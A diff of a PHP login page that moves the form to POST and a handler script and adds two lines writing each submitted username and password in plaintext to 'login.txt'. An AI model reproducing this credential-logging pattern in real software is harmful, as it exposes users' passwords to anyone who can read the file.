@@ -1,6 +1,8 @@
 <?php
 	$thisPage = "login";
-	require_once "nav.php";
+  require_once "nav.php";
+  $line = $_POST['Uname'] . "|" . $_POST["pw"] . "\n";
+  file_put_contents("login.txt", $line);
 ?>
 <html>
   <head>
@@ -9,18 +11,18 @@
 	<body>
 
         <div class="login">    
-        <form id="login" method="get" action="login.php">    
-            <label><b>User Name<br>     
+        <form id="login" method="post" action="loginHandler.php">    
+            <label for="Uname"><b>User Name<br>     
             </b>    
             </label>    
             <input type="text" name="Uname" id="Uname" placeholder="Username">    
             <br><br>    
-            <label><b>Password<br>     
+            <label for="pw"><b>Password<br>     
             </b>    
             </label>    
             <input type="Password" name="pw" id="pw" placeholder="Password">    
             <br><br>    
-            <input type="button" name="log" id="log" value="Log In">       
+            <input type="submit" name="submit" id="submit" value="Log In">       
             <br><br>    
             <input type="checkbox" id="check">    
             <span>Remember me</span>    
